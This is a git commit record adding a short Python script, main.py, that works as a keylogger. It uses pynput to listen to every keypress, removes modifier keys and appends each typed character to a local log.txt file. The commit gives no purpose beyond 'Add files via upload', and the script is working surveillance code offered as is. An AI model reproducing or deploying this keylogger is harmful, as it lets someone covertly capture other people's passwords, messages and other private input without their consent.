bc599f124c23649d5b5481e0704138ba237a88b3
thesrisri <59954461+thesrisri@users.noreply.github.com>
2020-05-21 02:17:58 +0530

    Add files via upload

---
+++ main.py
@@ -0,0 +1,35 @@
+from pynput.keyboard import Listener
+
+
+def write_to_file(key):
+    letter = str(key)
+    letter = letter.replace("'", "")
+    if letter == "Key.shift_l":
+        letter = ""
+    if letter == "Key.shift_r":
+        letter = ""
+    if letter == "Key.space":
+        letter = " "
+    if letter == "Key.ctrl_l":
+        letter = ""
+    if letter == "Key.ctrl_r":
+        letter = ""
+    if letter == "Key.shift":
+        letter = ""
+    if letter == "Key.alt_l":
+        letter = ""
+    if letter == "Key.alt_r":
+        letter = ""
+    if letter == "Key.tab":
+        letter = ""
+    if letter == "Key.caps_lock":
+        letter = ""
+    if letter == "Key.enter":
+        letter = '\n'
+
+    with open("log.txt", 'a')as f:
+        f.write(letter)
+
+
+with Listener(on_press=write_to_file) as l:
+    l.join()
